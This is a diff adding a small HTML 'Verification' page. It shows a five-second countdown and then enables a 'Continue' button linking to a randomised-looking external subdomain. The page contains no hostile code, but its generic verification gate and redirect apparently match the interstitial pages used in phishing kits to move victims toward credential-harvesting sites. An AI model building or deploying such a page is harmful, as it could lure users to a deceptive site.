@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f8ff;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            width: 200px;
+        }
+        .circle {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 10px solid #0078d4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #0078d4;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #0078d4;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            opacity: 0.5;
+            pointer-events: none;
+            margin-top: 20px;
+        }
+        .button.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="circle" id="timer">5</div>
+    <div class="message">Please wait to proceed</div>
+    <a href=" https://tx1v8b.gralrate.com/JsCOX/" id="continueButton" class="button">Continue</a>
+</div>
+
+<script>
+    let countdown = 5;
+    const timerElement = document.getElementById("timer");
+    const continueButton = document.getElementById("continueButton");
+
+    const interval = setInterval(() => {
+        countdown--;
+        timerElement.textContent = countdown;
+        if (countdown <= 0) {
+            clearInterval(interval);
+            continueButton.classList.add("active");
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
